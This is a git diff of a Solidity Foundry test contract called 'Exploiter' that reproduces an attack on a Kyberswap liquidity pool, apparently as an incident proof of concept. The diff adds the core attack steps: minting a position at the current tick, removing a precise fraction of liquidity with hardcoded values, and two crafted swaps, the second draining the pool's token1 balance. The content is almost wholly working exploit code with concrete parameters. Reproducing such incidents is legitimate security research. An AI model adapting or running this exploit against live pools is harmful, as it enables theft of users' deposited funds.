@@ -80,7 +80,7 @@ contract Exploiter is Test {
         int256 __delta_1;
 
         int256 __tick_distance;
-        uint24 __fee;
+        uint24 __swap_fee;
 
         uint160 __sqrtP;
         int24 __currentTick;
@@ -107,20 +107,23 @@ contract Exploiter is Test {
         emit log_named_int("d1", __delta_1);
 
         __tick_distance = IKyberswapPool(_victim).tickDistance(); // 1
-        __fee = IKyberswapPool(_victim).swapFeeUnits(); // 10
+        __swap_fee = IKyberswapPool(_victim).swapFeeUnits(); // 10
         
         // step 2: supply liquidity
         (__sqrtP, __currentTick, __nearestCurrentTick,) = IKyberswapPool(_victim).getPoolState();
         (__baseL, __reinvestL, __reinvestLLast) = IKyberswapPool(_victim).getLiquidityState();
+        emit log_named_int("currentT", __currentTick);
         emit log_named_uint("sqrtP", __sqrtP);
         emit log_named_uint("baseL", uint256(__baseL));
-        (__token_id,,,) = IKyberswapPositionManager(_manager).mint(IKyberswapPositionManager.MintParams(_token0, _token1, __fee, __currentTick, 111310, [__nearestCurrentTick, __nearestCurrentTick], 6948087773336076, 107809615846697233, 0, 0, _attacker, 1700693711));
+        (__token_id,,,) = IKyberswapPositionManager(_manager).mint(IKyberswapPositionManager.MintParams(_token0, _token1, __swap_fee, __currentTick, 111310, [__nearestCurrentTick, __nearestCurrentTick], 6948087773336076, 107809615846697233, 0, 0, _attacker, block.timestamp));
         
         // step 3: remove liquidity (14938549516730950591 = (1/6) * liquidity)
         (__baseL, __reinvestL, __reinvestLLast) = IKyberswapPool(_victim).getLiquidityState();
-        IKyberswapPositionManager(_manager).removeLiquidity(IKyberswapPositionManager.RemoveLiquidityParams(__token_id, __baseL / 6, 0, 0, 1700693711));
+        IKyberswapPositionManager(_manager).removeLiquidity(IKyberswapPositionManager.RemoveLiquidityParams(__token_id, 14938549516730950591, 0, 0, block.timestamp)); // __baseL / 6
 
-        // step 4
+        // step 4: back and forth swaps
+        (__delta_0, __delta_1) = IKyberswapPool(_victim).swap(_attacker, 387170294533119999999, false, 1461446703485210103287273052203988822378723970341, "");
+        (__delta_0, __delta_1) = IKyberswapPool(_victim).swap(_attacker, -int256(IERC20(_token1).balanceOf(_victim)), false, 4295128740, "");
 
         // balances
         emit log_named_uint("l0", IERC20(_token0).balanceOf(_victim));
